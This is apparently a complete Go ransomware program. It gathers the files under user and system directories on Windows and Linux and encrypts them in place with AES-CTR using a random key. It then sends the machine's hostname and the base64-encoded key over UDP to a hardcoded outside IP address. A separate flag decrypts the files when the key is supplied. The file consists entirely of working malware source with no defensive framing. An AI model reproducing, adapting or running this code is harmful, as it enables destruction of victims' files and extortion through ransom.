package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
)

var wg sync.WaitGroup
var wgc sync.WaitGroup

var CryptKey = aesKey()

var IV = []byte("1234567812345678")

func createKey() []byte {
	genkey := make([]byte, 32)
	_, err := rand.Read(genkey)
	if err != nil {
		log.Fatalf("Failed to read new random key: %s", err)
	}
	return genkey
}

func aesKey() []byte {
	key := createKey()
	return key
}

func createCipher() cipher.Block {
	c, err := aes.NewCipher(CryptKey)
	if err != nil {
		log.Fatalf("Failed to create the AES cipher: %s", err)
	}
	return c
}

func Crypt(filename string, ch chan string) {
	file, _ := os.Open(filename)
	fileInfo, err := os.Stat(filename)
	if err != nil {
		wgc.Done()
		file.Close()
		Crypt(<-ch, ch)
	}
	arr := make([]byte, fileInfo.Size())
	_, _ = file.Read(arr)
	file.Close()
	blockCipher := createCipher()
	stream := cipher.NewCTR(blockCipher, IV)
	stream.XORKeyStream(arr, arr)
	_ = ioutil.WriteFile(filename, arr, 0644)
	wgc.Done()
	Crypt(<-ch, ch)
}

func DeCrypt(filename string, ch chan string) {
	bytes, _ := ioutil.ReadFile(filename)
	blockCipher, _ := aes.NewCipher(CryptKey)
	stream := cipher.NewCTR(blockCipher, IV)
	stream.XORKeyStream(bytes, bytes)
	_ = ioutil.WriteFile(filename, bytes, 0644)
	wgc.Done()
	DeCrypt(<-ch, ch)
}

func main() {
	var listfile []string
	switch runtime.GOOS {
	case "windows":
		root := "C:\\Users"
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			listfile = append(listfile, path)
			return nil
		})
		root = "C:\\Program Files (x86)"
		_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
			listfile = append(listfile, path)
			return nil
		})
		//root = "C:\\Program Files"
		//_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		//	listfile = append(listfile, path)
		//	return nil
		//})
	case "linux":
		cmd := exec.Command("bash", "-c", "find /home /opt /root /srv /tmp -type f -size -200M ! -path \"*.bash*\" ! -path \"*.desktop*\" ! -path \"*.cache*\" ! -path \"*.mozilla*\" 2> /dev/null")
		output, _ := cmd.CombinedOutput()
		listfile = strings.Split(string(output), "\n")
	}

	ch := make(chan string, len(listfile))

	for _, file := range listfile {
		wg.Add(1)
		wgc.Add(1)
		go func(file string) {
			ch <- file
			wg.Done()
		}(file)
	}
	wg.Wait()
	args := os.Args[1:]
	if len(args) == 0 {
		for i := 0; i < 100; i++ {
			if len(ch) == 0 {
				break
			}
			go Crypt(<-ch, ch)
		}
		c, err := net.Dial("udp", "139.59.147.33:25")
		if err != nil {
			fmt.Println(err)
			return
		}
		wgc.Wait()
		switch runtime.GOOS {
		case "windows":
			name := ""
			output, _ := exec.Command("wmic", "computersystem", "get", "name").Output()
			for _, letter := range string(output)[4:] {
				if letter != 32 && letter != 13 && letter != 10 {
					name += string(letter)
				}
			}
			fmt.Fprintf(c, name+"|"+base64.StdEncoding.EncodeToString(CryptKey))
		case "linux":
			cmd := exec.Command("cat", "/etc/hostname")
			output, _ := cmd.CombinedOutput()
			fmt.Fprintf(c, string(output)[:len(string(output))-1]+"|"+base64.StdEncoding.EncodeToString(CryptKey))
		}
	} else if len(args) == 2 && args[0] == "--decrypt" {
		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
		for i := 0; i < 100; i++ {
			if len(ch) == 0 {
				break
			}
			go DeCrypt(<-ch, ch)
		}
		wgc.Wait()
	}
	os.Exit(0)
}
